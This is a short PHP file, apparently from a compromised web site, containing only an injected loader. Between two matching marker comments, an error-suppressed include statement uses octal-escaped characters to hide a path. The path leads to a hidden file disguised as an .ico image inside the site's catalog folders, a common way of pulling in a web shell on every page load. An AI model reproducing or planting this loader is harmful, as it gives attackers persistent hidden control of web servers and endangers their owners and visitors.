<?php
/*81fe7*/

@include "\057home\057abzi\145l/pu\142lic_\150tml/\143atal\157g/mo\144el/s\145ttin\147/.f2\146a5c0\070.ico";

/*81fe7*/


